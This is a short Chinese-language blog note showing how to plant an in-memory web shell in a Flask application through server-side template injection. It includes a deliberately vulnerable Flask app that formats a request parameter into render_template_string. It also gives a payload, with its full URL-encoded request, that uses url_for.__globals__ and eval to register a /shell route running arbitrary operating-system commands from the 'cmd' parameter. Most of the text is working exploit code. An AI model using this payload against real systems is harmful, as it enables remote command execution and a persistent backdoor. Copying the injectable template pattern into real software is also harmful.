# Flask 内存马



一直遇到java打内存马的情景，想起来Flask也可以搞一个内存马试试。

模拟一个存在SSTI的Flask环境

```python
from flask import Flask,request
from flask import render_template_string
app = Flask(__name__)

@app.route('/')
def hello_world():
    return 'Hello World'


@app.route('/test',methods=['GET', 'POST'])
def test():
    template = '''
        <div class="center-content error">
            <h1>Oops! That page doesn't exist.</h1>
            <h3>%s</h3>
        </div> 
    ''' %(request.values.get('fxxk'))

    return render_template_string(template)


if __name__ == '__main__':
    app.run()
```

使用app.add_url_rule动态添加一个路由，请求上下文在_request_ctx_stack的栈里

payload:

```
url_for.__globals__['__builtins__']['eval']("app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())",{'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']})
```



## 流程：

打SSTI payload

```
http://127.0.0.1:5000/test?fxxk={{url_for.__globals__[%27__builtins__%27][%27eval%27](%22app.add_url_rule(%27/shell%27,%20%27shell%27,%20lambda%20:__import__(%27os%27).popen(_request_ctx_stack.top.request.args.get(%27cmd%27,%20%27whoami%27)).read())%22,{%27_request_ctx_stack%27:url_for.__globals__[%27_request_ctx_stack%27],%27app%27:url_for.__globals__[%27current_app%27]})}}
```

访问/shell内存马地址：

![image-20210326182004878](https://static.hexlt.org/img/20210326182010.png)

## 参考：

Flask上下文管理机制: https://www.cnblogs.com/bigox/p/11652859.html
